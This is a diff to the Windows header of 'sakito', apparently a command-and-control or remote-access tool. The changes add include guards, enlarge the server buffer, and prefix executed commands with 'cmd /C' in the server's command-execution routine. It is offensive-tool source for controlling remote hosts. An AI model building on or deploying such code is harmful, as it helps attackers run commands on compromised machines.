@@ -2,6 +2,17 @@
 Coded by d4rkstat1c.
 Use educationally/legally.
 */
+#ifndef SAKITO_SWIN_UTILS_H
+#define SAKITO_SWIN_UTILS_H
+
+#include <WS2tcpip.h>
+#include <Windows.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <errno.h>
+
 #define CONSOLE_FSTR "sak1to-console-(%s>"
 #define INTERACT_FSTR "%d-(%s)-%s>"
 #define WINDOWS 1
@@ -25,7 +36,7 @@ typedef struct {
 	HANDLE ghMutex;
 
 	// Server buffer.
-	char buf[BUFLEN + 1];
+	char buf[BUFLEN + 9]; // BUFLEN + space for 'command code' + "cmd /C " + '\0'
 
 	// Thread handle for handling execution/termination of accept_conns thread.
 	HANDLE acp_thread;
@@ -169,7 +180,9 @@ uint64_t sakito_file_size(s_file file)
 
 void exec_cmd(Server_map* const s_map) 
 {
-	sakito_win_cp(NULL, s_map->buf);
+	char cmd_buf[8+BUFLEN] = "cmd /C ";
+	strcat(cmd_buf, s_map->buf);
+	sakito_win_cp(NULL, cmd_buf);
 	fputc('\n', stdout);
 }
 
@@ -219,3 +232,5 @@ void sakito_init(Server_map* const s_map)
 	// Begin accepting connections.
 	s_map->acp_thread = CreateThread(0, 0, accept_conns, s_map, 0, 0);
 }
+
+#endif
